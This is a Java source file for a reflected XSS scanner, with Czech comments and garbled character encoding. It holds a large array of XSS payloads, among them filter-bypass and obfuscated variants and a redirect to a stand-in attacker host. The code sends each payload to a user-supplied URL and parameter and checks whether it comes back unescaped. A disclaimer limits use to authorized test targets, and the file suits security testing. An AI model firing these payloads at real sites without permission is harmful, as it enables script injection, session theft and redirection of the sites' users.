package SecurityTools;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class XSSReflectedVulnerabilityTester {

	// --- CEL√Å ARM√ÅDA XSS PAYLOAD≈Æ ---
	private static final String[] XSS_PAYLOADS = {
			// 1. Basic Script Tags
			"<script>alert(1)</script>", "<script>alert(document.domain)</script>", "<script>alert('XSS')</script>",
			"<script>console.log('XSS')</script>", "<script>window.location='http://attacker.com'</script>",
			"<script>alert(/XSS/)</script>", // alert with regex
			"<script>confirm(1)</script>", "<script>prompt(1)</script>",

			// 2. Image Tags (onerror bypass)
			"<img src=x onerror=alert(1)>", "<img src=x onerror=alert(document.domain)>",
			"<img src=x onerror=alert('XSS')>", "<img src=/ onerror=alert(1)>", // No source
			"<img src=http://invalid.url/x.png onerror=alert(1)>",

			// 3. SVG Tags (onload bypass)
			"<svg/onload=alert(1)>", "<svg/onload=alert(document.domain)>", "<svg/onload=alert('XSS')>",
			"<svg onload=alert(1)><script>", // Combined
			"<svg onload=alert(1)>", // In HTML comment
			"<br size=\"&{alert('XSS')}\">", // For old IE
			"<XSS style=\"xss:expression(alert(1))\">", // Old IE
			"<div onmousemove=alert(1)>", // Another event handler
			"<body onpageshow=alert(1)>", // Another body event
			"<img \"\"\"<script>alert(\"XSS\")</script>\">", // Malformed HTML
			"<script/src=data:text/javascript,alert(1)>", // Data URI for script src
			"<video><source onerror=\"alert(1)\">", "<a onmouseover='alert(1)'>",
			"<xss id=x onmouseover=alert(1) style=width:1000px;height:1000px;> ", "<marquee onstart=alert(1)>",
			"<body background=\"javascript:alert(1)\">", "<div onresize=alert(1)></div>", // Needs resize context

			// 13. Null byte and other tricky characters (URLEncoder might handle some)
			"&javascript:alert(1)", // Ampersand in front
			"`javascript:alert(1)`", // Backticks
			"\"`--><script>alert(1)</script>", "<s&#99;ript>alert(1)</s&#99;ript>", // Obfuscated with HTML entities
			"<scri%00pt>alert(1)</scri%00pt>", // Null byte injection (might be filtered by URL encoding or server)
			"<scri\\pt>alert(1)</scri\\pt>", // Backslash bypass
			"<img src=x on'error'=alert(1)>", // Quotes in attributes
			"<a onmouseover=alert(1)>x</a>", "<img src=x onerror=alert`1`>", // Using backticks instead of parentheses
			"<xss id=confirm(1) onmouseover=eval(id)>", // eval context
			"<input type=\"image\" src=\"x\" onerror=\"alert('XSS')\">", // Image input

			// 14. Common HTML tag injection
			"<details open ontoggle=alert(1)>", // HTML5
			"<math><a xlink:href='javascript:alert(1)'>", // SVG/MathML context
			"<isindex action=javascript:alert(1) type=text>", // Old HTML
			"<form action=\"javascript:alert(1)\"><input type=submit>",

			// 15. Closing tags and appending script
			"</title><script>alert(1)</script>", "</textarea><script>alert(1)</script>",
			"\"</script><script>alert(1)</script>", "<script>alert(1)</script>", // Breaking out of comments

			// 16. Unicode and various encodings (URLEncoder handles basic, but some might
			// be server-side quirks)
			"<script>alert(unescape('XSS'))</script>", // JS unescape
			"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", // ASCII to char codes
			"<script>eval(atob('YWxlcnQoMSk='))</script>", // Base64 encoded alert(1)

			// 17. Filter Bypass (if the server is filtering specific words or characters)
			"<scr<script>ipt>alert(1)</scr</script>ipt>", // Doubling up
			"<IMG SRC=JaVaScRiPt:alert('XSS')>", // Case variations
			"<xss onattribute=alert(1)>", // Dummy attribute

			// 18. DOM XSS specific (less relevant for this reflected scanner, but good to
			// include for completeness)
			"<script>location.hash='#'+'<script>alert(1)</script>'</script>",
			"<a href='#<script>alert(1)</script>'>click</a>",
			// These often rely on client-side JS parsing, not server reflection directly in
			// the HTML response.
	};

	public static void main(String[] args) {
		Scanner scanner = new Scanner(System.in);

		// *** VELMI D≈ÆLE≈ΩIT√â ETIKEck√© UPOZORNƒöN√ç ***
		System.out.println("**********************************************************************************");
		System.out.println("!!! UPOZORNƒöN√ç: Toto je n√°stroj pro vzdƒõl√°vac√≠ a demonstrativn√≠ √∫ƒçely !!!");
		System.out.println(
				"!!! Pou≈æ√≠vejte jej POUZE na syst√©mech, k nim≈æ m√°te V√ùSLOVN√â, P√çSEMN√â POVOLEN√ç od vlastn√≠ka. !!!");
		System.out.println("!!! Testov√°n√≠ bez povolen√≠ je NELEG√ÅLN√ç a m≈Ø≈æe v√©st k V√Å≈ΩN√ùM PR√ÅVN√çM D≈ÆSLEDK≈ÆM. !!!");
		System.out.println(
				"!!! Zamƒõ≈ôte se na testovac√≠ prost≈ôed√≠ (nap≈ô. OWASP Juice Shop, bWAPP, vlastn√≠ lok√°ln√≠ server). !!!");
		System.out.println("**********************************************************************************\n");

		System.out.println("--- Jednoduch√Ω XSS Reflected Tester ---");
		System.out.println(
				"Zadejte c√≠lovou URL, kter√° m√° reflektuj√≠c√≠ parametr (nap≈ô. http://testphp.vulnweb.com/search.php):");
		String baseUrl = scanner.nextLine();

		System.out.println("Zadejte n√°zev GET parametru pro injekci (nap≈ô. 'test' pro search.php?test=):");
		String paramName = scanner.nextLine();

		System.out.println("\nSpou≈°t√≠m XSS testov√°n√≠ na: " + baseUrl + " s parametrem: " + paramName);

		for (String payload : XSS_PAYLOADS) {
			System.out.println("\n--- Testuji payload: " + payload + " ---");
			HttpURLConnection connection = null;

			try {
				String encodedPayload = URLEncoder.encode(payload, StandardCharsets.UTF_8.toString());
				String fullUrlString = baseUrl + "?" + paramName + "=" + encodedPayload;

				URI uri = new URI(fullUrlString);
				URL url = uri.toURL();

				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");
				connection.setConnectTimeout(5000);
				connection.setReadTimeout(5000);

				int responseCode = connection.getResponseCode();
				System.out.println("Response Code: " + responseCode);

				BufferedReader in = null;
				if (responseCode >= 400) {
					in = new BufferedReader(new InputStreamReader(connection.getErrorStream(), StandardCharsets.UTF_8));
				} else {
					in = new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
				}

				StringBuilder response = new StringBuilder();
				String inputLine;
				while ((inputLine = in.readLine()) != null) {
					response.append(inputLine);
				}
				in.close();

				String responseBody = response.toString();

				// KL√çƒåOV√Å ƒå√ÅST: Kontrola, zda je payload reflektov√°n v nezmƒõnƒõn√© podobƒõ
				// Pou≈æ√≠v√°me String.contains(), co≈æ je jednoduch√©, ale nemus√≠ zachytit v≈°echny
				// o≈°et≈ôen√≠
				if (responseBody.contains(payload)) {
					System.out.println("üö® XSS ZRANITELNOST POTENCI√ÅLNƒö DETEKOV√ÅNA! Payload '" + payload
							+ "' se objevil v odpovƒõdi.");
				} else {
					System.out.println("‚úÖ Payload '" + payload + "' nebyl reflektov√°n nebo byl spr√°vnƒõ o≈°et≈ôen.");
				}

			} catch (Exception e) {
				System.err.println("‚ùå Chyba p≈ôi pos√≠l√°n√≠ po≈æadavku nebo ƒçten√≠ odpovƒõdi: " + e.getMessage());
			} finally {
				if (connection != null) {
					connection.disconnect();
				}
			}
		}

		System.out.println("\n--- XSS Reflected Test dokonƒçen. ---");
		scanner.close();
	}
}